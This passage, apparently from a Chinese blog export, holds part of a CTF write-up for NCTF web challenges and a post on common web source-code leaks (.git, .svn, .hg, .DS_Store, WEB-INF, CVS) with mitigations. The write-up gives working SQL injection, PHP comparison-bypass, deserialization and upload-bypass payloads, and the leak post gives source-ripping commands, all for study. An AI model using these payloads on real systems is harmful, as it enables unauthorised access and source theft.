&apos;必须输入数字才行&apos;;        else if (strpos ($_GET[&apos;nctf&apos;], &apos;#biubiubiu&apos;) !== FALSE)               die(&apos;Flag: &apos;.$flag);        else            echo &apos;骚年，继续努力吧啊~&apos;;    &#125;</div></pre></td></tr></table></figure><p>ereg(mode, string subject, array regs);</p><p>mode：正则表达式（preg_match中的mode必须以’/‘开始和“/”结束）</p><p>subject： 需要验证的字符串</p><p>matchs/regs： 匹配后得到的结果。以数组的形式存储</p><p>strpos() 函数查找字符串在另一字符串中第一次出现的位置。</p><p>构造：</p><p><a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=2%00%23biubiubiu" target="_blank" rel="external">http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=2%00%23biubiubiu</a></p><p>网上也有说构造</p><p><a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf[]=" target="_blank" rel="external">http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf[]=</a></p><p>这个原因是因为报错并返回null（多亏了wonderkun大佬）</p><h4 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h4><p>这个题跟上面那个是不一样的，注意是===</p><p>所以姿势如下：<a href="http://www.cnblogs.com/weidiao/p/6821812.html" target="_blank" rel="external">http://www.cnblogs.com/weidiao/p/6821812.html</a></p><p><a href="http://chinalover.sinaapp.com/web17/index.php?a[]=a&amp;&amp;b[]=c" target="_blank" rel="external">http://chinalover.sinaapp.com/web17/index.php?a[]=a&amp;&amp;b[]=c</a></p><h4 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h4><p>看下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) &#123; ?&gt;</div><div class="line"></div><div class="line">    &lt;?php</div><div class="line"></div><div class="line">    extract($_POST);</div><div class="line"></div><div class="line">    if ($pass == $thepassword_123) &#123; ?&gt;</div><div class="line"></div><div class="line">        &lt;div class=&quot;alert alert-success&quot;&gt;</div><div class="line"></div><div class="line">            &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt;</div><div class="line"></div><div class="line">        &lt;/div&gt;</div><div class="line"></div><div class="line">    &lt;?php &#125; ?&gt;</div><div class="line"></div><div class="line">&lt;?php &#125; ?&gt;</div></pre></td></tr></table></figure><p>extract()出现的问题，详情见：</p><p><a href="http://www.cnblogs.com/sqyysec/p/6926095.html" target="_blank" rel="external">http://www.cnblogs.com/sqyysec/p/6926095.html</a></p><p>构造：</p><p>pass=1&amp;thepassword_123=1 post方式提交就行（使用hackbar和burp均可）</p><h4 id="PHP是世界上最好的语言"><a href="#PHP是世界上最好的语言" class="headerlink" title="PHP是世界上最好的语言"></a>PHP是世界上最好的语言</h4><p><a href="http://way.nuptzj.cn/php/index.txt" target="_blank" rel="external">http://way.nuptzj.cn/php/index.txt</a>看到源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</div><div class="line">  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);</div><div class="line">  exit();</div><div class="line">&#125;</div><div class="line"></div><div class="line">$_GET[id] = urldecode($_GET[id]);</div><div class="line">if($_GET[id] == &quot;hackerDJ&quot;)</div><div class="line">&#123;</div><div class="line">  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;</div><div class="line">  echo &quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure><p>id的内容要跟hackerDJ不相同，但是urldecode之后要和hackerDJ相同</p><p>其实在此处考察的是$_GET[]本身就有urldecode的功能，所以构造：%2568ackerDJ即可</p><p>nctf{php_is_best_language}</p><h4 id="伪装者"><a href="#伪装者" class="headerlink" title="伪装者"></a>伪装者</h4><p>看到这句“管理系统只能在本地登陆”就知道了</p><p>抓包增加：X-Forwarded-For: 127.0.0.1</p><p>nctf{happy_http_headers}</p><h4 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h4><p>flag在响应头中，用burp看下就行</p><p>nctf{tips_often_hide_here}</p><h4 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h4><p>这题网上大多都写错了，有必要一写。</p><p>首先我们上传1.png（但实际文件内容写的是php一句话）</p><p>上传成功，我们可以知道与文件内容无关。重要的是：最终路径是拼接了 dir 和 filename 的，那么我们在 dir 处 00 截断为 .php 即可绕过。</p><p>具体的方式为用burp在hex中将空格20修改为00</p><p>nctf{welcome_to_hacks_world}</p><h4 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h4><p>知道了是post注入之后我们看代码就好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</div><div class="line">    mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</div><div class="line">  mysql_select_db(SAE_MYSQL_DB);</div><div class="line">  $user = trim($_POST[user]);</div><div class="line">  $pass = md5(trim($_POST[pass]));</div><div class="line">  $sql=&quot;select user from ctf where (user=&apos;&quot;.$user.&quot;&apos;) and (pw=&apos;&quot;.$pass.&quot;&apos;)&quot;;</div><div class="line">    echo &apos;&lt;/br&gt;&apos;.$sql;</div><div class="line">  $query = mysql_fetch_array(mysql_query($sql));</div><div class="line">  if($query[user]==&quot;admin&quot;) &#123;</div><div class="line">      echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;;</div><div class="line">  &#125;</div><div class="line">  if($query[user] != &quot;admin&quot;) &#123;</div><div class="line">    echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">echo $query[user];</div><div class="line">?&gt;</div></pre></td></tr></table></figure><p>trim()是去除两侧空格，重点在于依据下面这句进行构造</p><p>$sql=”select user from ctf where (user=’”.$user.”‘) and (pw=’”.$pass.”‘)”;</p><p>构造：admin’)#即可， ‘)用来分别用来闭合 #用来把后面给注释掉</p><p>nctf{ni_ye_hui_sql?}</p><h4 id="pass-check"><a href="#pass-check" class="headerlink" title="pass check"></a>pass check</h4><p>来继续审计：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$pass=@$_POST[&apos;pass&apos;];</div><div class="line">$pass1=***********;//被隐藏起来的密码</div><div class="line">if(isset($pass))</div><div class="line">&#123;</div><div class="line">if(@!strcmp($pass,$pass1))&#123;</div><div class="line">echo &quot;flag:nctf&#123;*&#125;&quot;;</div><div class="line">&#125;else&#123;</div><div class="line">echo &quot;the pass is wrong!&quot;;</div><div class="line">&#125;</div><div class="line">&#125;else&#123;</div><div class="line">echo &quot;please input pass!&quot;;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure><p>strcmp() 函数比较两个字符串。依据提示我们需要构造pass与pass1相等才行，但是我又不知道pass1，但是strcmp()比较，若相等返回0！但是null和0是等价的，所以我们让其返回null即可。构造：pass[]=hack 把这个post上去就行</p><p>flag:nctf{strcmp_is_n0t_3afe}</p><h4 id="起名字真难"><a href="#起名字真难" class="headerlink" title="起名字真难"></a>起名字真难</h4><p>审计！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"> function noother_says_correct($number)</div><div class="line">&#123;</div><div class="line">        $one = ord(&apos;1&apos;);//ord() 函数返回字符串的首个字符的 ASCII 值。</div><div class="line">        $nine = ord(&apos;9&apos;);</div><div class="line">        for ($i = 0; $i &lt; strlen($number); $i++)</div><div class="line">        &#123;   </div><div class="line">                $digit = ord($number&#123;$i&#125;);</div><div class="line">                if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</div><div class="line">                &#123;</div><div class="line">                        return false;</div><div class="line">                &#125;</div><div class="line">        &#125;</div><div class="line">           return $number == &apos;54975581388&apos;;</div><div class="line">&#125;</div><div class="line">$flag=&apos;*******&apos;;</div><div class="line">if(noother_says_correct($_GET[&apos;key&apos;]))</div><div class="line">    echo $flag;</div><div class="line">else </div><div class="line">    echo &apos;access denied&apos;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure><p>要求：id中的字符串不能有数字，而想得到flag又要进去的是要数字</p><p>构造：54975581388的16进制 0xccccccccc</p><p>提交得到flag:nctf{follow_your_dream}</p><h4 id="密码重置"><a href="#密码重置" class="headerlink" title="密码重置"></a>密码重置</h4><p>其中涉及了URL编码和base64编码，burp抓包修改成admin就行</p><p>nctf{reset_password_often_have_vuln}</p><h4 id="php反序列化"><a href="#php反序列化" class="headerlink" title=".php反序列化"></a>.php反序列化</h4><p>审计！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">class just4fun &#123;</div><div class="line">    var $enter;</div><div class="line">    var $secret;</div><div class="line">&#125;</div><div class="line"></div><div class="line">if (isset($_GET[&apos;pass&apos;])) &#123;</div><div class="line">    $pass = $_GET[&apos;pass&apos;];</div><div class="line"></div><div class="line">    if(get_magic_quotes_gpc())&#123;</div><div class="line">        $pass=stripslashes($pass);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $o = unserialize($pass);</div><div class="line"></div><div class="line">    if ($o) &#123;</div><div class="line">        $o-&gt;secret = &quot;*&quot;;</div><div class="line">        if ($o-&gt;secret === $o-&gt;enter)</div><div class="line">            echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret;</div><div class="line">        else </div><div class="line">            echo &quot;Oh no... You can&apos;t fool me&quot;;</div><div class="line">    &#125;</div><div class="line">    else echo &quot;are you trolling?&quot;;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure><p>题目的意思就是一个序列化过后的字符串与类中的变量始终保持相同，可以想到引用a=&amp;b</p><p>（这可以当成一个专题讲讲）</p><p>1.php的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">&lt;?php   </div><div class="line"></div><div class="line">class just4fun &#123;  </div><div class="line"></div><div class="line">    var $enter;  </div><div class="line"></div><div class="line">    var $secret;  </div><div class="line"></div><div class="line">    function just4fun()  </div><div class="line"></div><div class="line">    &#123;  </div><div class="line"></div><div class="line">        $this-&gt;enter=&amp;$this-&gt;secret;  </div><div class="line"></div><div class="line">    &#125;  </div><div class="line"></div><div class="line">&#125;  </div><div class="line"></div><div class="line">echo serialize(new just4fun());  </div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure><p>执行一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">➜  Desktop php 1.php</div><div class="line"></div><div class="line">O:8:&quot;just4fun&quot;:2:&#123;s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;&#125;</div></pre></td></tr></table></figure><p>构造：</p><p><a href="http://115.28.150.176/php1/index.php?pass=O:8:%22just4fun%22:2:{s:5:%22enter%22;N;s:6:%22secret%22;R:2;}" target="_blank" rel="external">http://115.28.150.176/php1/index.php?pass=O:8:”just4fun”:2:{s:5:”enter”;N;s:6:”secret”;R:2;}</a></p><p>得到flag</p><p>nctf{serialize_and_unserialize}</p><h4 id="sql-injection-4"><a href="#sql-injection-4" class="headerlink" title="sql injection 4"></a>sql injection 4</h4><p>审计！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">&lt;!--</div><div class="line">#GOAL: login as admin,then get the flag;</div><div class="line">error_reporting(0);</div><div class="line">require &apos;db.inc.php&apos;;</div><div class="line"></div><div class="line">function clean($str)&#123;</div><div class="line">if(get_magic_quotes_gpc())&#123;//当 magic_quotes_gpc 打开时，所有的 ’ (单引号), ” (双引号),                   \ (反斜线) and 空字符会自动转为含有反斜线的转义字符</div><div class="line">$str=stripslashes($str);//与stripslashes()搭配使用，此函数是删除所有的\的 </div><div class="line">&#125;</div><div class="line">return htmlentities($str, ENT_QUOTES);//htmlentities($str, ENT_QUOTES)是指编码所有的双引号和单引号</div><div class="line">&#125;</div><div class="line"></div><div class="line">$username = @clean((string)$_GET[&apos;username&apos;]);</div><div class="line">$password = @clean((string)$_GET[&apos;password&apos;]);</div><div class="line"></div><div class="line">$query=&apos;SELECT * FROM users WHERE name=\&apos;&apos;.$username.&apos;\&apos; AND pass=\&apos;&apos;.$password.&apos;\&apos;;&apos;;</div><div class="line">$result=mysql_query($query);</div><div class="line">if(!$result || mysql_num_rows($result) &lt; 1)&#123;</div><div class="line">die(&apos;Invalid password!&apos;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">echo $flag;</div><div class="line">--&gt;</div></pre></td></tr></table></figure><p>重点在于：</p><p>在这里由于’被转编码，所以可以使用\转义</p><p><code>$query=&#39;SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;&#39;;</code></p><p>构造：<code>http://chinalover.sinaapp.com/web15/index.php?username=admin\&amp;password=%20or%201%23</code></p><p>插入后大致的sql语句为：<code>SELECT * FROM users WHERE name=’ admin\’ AND pass=’ or 1#’;</code></p><h4 id="综合题"><a href="#综合题" class="headerlink" title="综合题"></a>综合题</h4><p>zh个很有意思，首先是一个jsfuck，不用解码，直接执行就可以</p><p>执行后得到：1bc29b36f623ba82aaf6724fd3b16718.php</p><p>打开发现不是这回事</p><p>又看提示，想到bash的一些相关，再看这个网页的header发现tip “history of bash”</p><p>bash_history是用来存放历史记录的，所以我们就访问</p><p><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history" target="_blank" rel="external">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history</a></p><p>又得到提示：zip -r flagbak.zip ./*</p><p>那么就访问这个：</p><p><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip" target="_blank" rel="external">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip</a></p><p>下载解压得到flag is:nctf{bash_history_means_what}</p><h4 id="有源码"><a href="#有源码" class="headerlink" title="有源码"></a>有源码</h4><p>给了题目的源码，可以自己搭建环境来尝试</p><p><a href="https://github.com/otakekumi/NUPT_Challenges/tree/master/WEB" target="_blank" rel="external">https://github.com/otakekumi/NUPT_Challenges/tree/master/WEB</a></p><h4 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h4><p>审计！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</div><div class="line">   mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</div><div class="line">  mysql_select_db(SAE_MYSQL_DB);</div><div class="line">  $user = $_POST[user];</div><div class="line">  $pass = md5($_POST[pass]);</div><div class="line">  $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&apos;$user&apos;&quot;));</div><div class="line">  if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</div><div class="line">      echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;;</div><div class="line">  &#125;</div><div class="line">  else &#123;</div><div class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure><p>strcasecmp是不分大小比较，这样只要得到密码md5值相同即可，提示已经说了用union所以我们来构造payload：</p><p>username填写’ union select md5(1)#</p><p>password填写1</p><p>得flag：ntcf{union_select_is_wtf}</p><p>剩余的题目不建议小白来做，想做的看这个链接</p><p><a href="http://blog.csdn.net/qq_31481187/article/details/52097287?locationNum=9" target="_blank" rel="external">http://blog.csdn.net/qq_31481187/article/details/52097287?locationNum=9</a></p><p>或者：</p><p><a href="https://www.40huo.cn/blog/nctf-writeup.html" target="_blank" rel="external">https://www.40huo.cn/blog/nctf-writeup.html</a></p><p>（ps：东西太多写不动了。。。）</p><p>总结：可以写点base64、base32、url编码解码、文本与16进制转换的小工具。&lt;&lt;&lt;可以练手，但是hackbar带全了和burp</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>常见Web源码泄露总结</title>
      <link href="/2017/01/25/%E5%B8%B8%E8%A7%81Web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%80%BB%E7%BB%93/"/>
      <url>/2017/01/25/%E5%B8%B8%E8%A7%81Web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>本文主要是记录一下常见的源码泄漏问题，这些经常在web渗透测试以及CTF中出现。</p><h3 id="源码泄漏分类"><a href="#源码泄漏分类" class="headerlink" title="源码泄漏分类"></a>源码泄漏分类</h3><h4 id="hg源码泄漏"><a href="#hg源码泄漏" class="headerlink" title=".hg源码泄漏"></a>.hg源码泄漏</h4><h5 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h5><p>hg init的时候会生成.hg</p><p>e.g.<a href="http://www.example.com/.hg/" target="_blank" rel="external">http://www.example.com/.hg/</a></p><h5 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><p>工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rip-hg.pl -v -u http://www.example.com/.hg/</div></pre></td></tr></table></figure><h4 id="git源码泄漏"><a href="#git源码泄漏" class="headerlink" title=".git源码泄漏"></a>.git源码泄漏</h4><h5 id="漏洞成因：-1"><a href="#漏洞成因：-1" class="headerlink" title="漏洞成因："></a>漏洞成因：</h5><p>在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p><p>e.g. <a href="http://www.example.com/.git/config" target="_blank" rel="external">http://www.example.com/.git/config</a></p><h5 id="漏洞利用：-1"><a href="#漏洞利用：-1" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><p>工具：</p><p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="external">GitHack</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GitHack.py http://www.example.com/.git/</div></pre></td></tr></table></figure><p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rip-git.pl -v -u http://www.example.com/.git/</div></pre></td></tr></table></figure><h4 id="DS-Store文件泄漏"><a href="#DS-Store文件泄漏" class="headerlink" title=".DS_Store文件泄漏"></a>.DS_Store文件泄漏</h4><h5 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因:"></a>漏洞成因:</h5><p>在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。</p><h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h5><p><a href="http://www.example.com/.ds_store" target="_blank" rel="external">http://www.example.com/.ds_store</a></p><p>注意路径检查</p><p>网站备份压缩文件</p><p>在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</p><p>工具：</p><p><a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="external">ds_store_exp</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python ds_store_exp.py http://www.example.com/.DS_Store</div></pre></td></tr></table></figure><h5 id="漏洞成因及危害"><a href="#漏洞成因及危害" class="headerlink" title="漏洞成因及危害:"></a>漏洞成因及危害:</h5><p>该漏洞的成因主要有以下两种：</p><ol><li>服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。</li><li>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。</li></ol><h5 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">.rar</div><div class="line"></div><div class="line">.zip</div><div class="line"></div><div class="line">.7z</div><div class="line"></div><div class="line">.tar.gz</div><div class="line"></div><div class="line">.bak</div><div class="line"></div><div class="line">.swp</div><div class="line"></div><div class="line">.txt</div><div class="line"></div><div class="line">.html</div></pre></td></tr></table></figure><h5 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find . -name <span class="string">".DS_Store"</span> -print0 | xargs -0 rm -rf <span class="comment">#递归删除".DS_Store"文件</span></div></pre></td></tr></table></figure><h4 id="SVN导致文件泄露"><a href="#SVN导致文件泄露" class="headerlink" title="SVN导致文件泄露"></a>SVN导致文件泄露</h4><h5 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h5><p>Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。</p><p>Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。</p><p>e.g.<a href="http://vote.lz.taobao.com/admin/scripts/fckeditor.266/editor/.svn/entries" target="_blank" rel="external">http://vote.lz.taobao.com/admin/scripts/fckeditor.266/editor/.svn/entries</a></p><h5 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h5><p>工具：</p><p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rip-svn.pl -v -u http://www.example.com/.svn/</div></pre></td></tr></table></figure><p><a href="https://pan.baidu.com/s/1mrNpB" target="_blank" rel="external">Seay-Svn</a></p><h4 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h4><h5 id="简介：-1"><a href="#简介：-1" class="headerlink" title="简介："></a>简介：</h5><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p><p>WEB-INF主要包含一下文件或目录：</p><p>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。/WEB-INF/database.properties：数据库配置文件</p><h5 id="漏洞成因：-2"><a href="#漏洞成因：-2" class="headerlink" title="漏洞成因："></a>漏洞成因：</h5><p>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。</p><h5 id="漏洞检测以及利用方法："><a href="#漏洞检测以及利用方法：" class="headerlink" title="漏洞检测以及利用方法："></a>漏洞检测以及利用方法：</h5><p>通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</p><p>一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！</p><h4 id="CVS泄漏"><a href="#CVS泄漏" class="headerlink" title="CVS泄漏"></a>CVS泄漏</h4><h5 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>测试的目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://url/CVS/Root 返回根信息</div><div class="line"></div><div class="line">http://url/CVS/Entries 返回所有文件的结构</div></pre></td></tr></table></figure><p>取回源码的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bk clone http://url/name 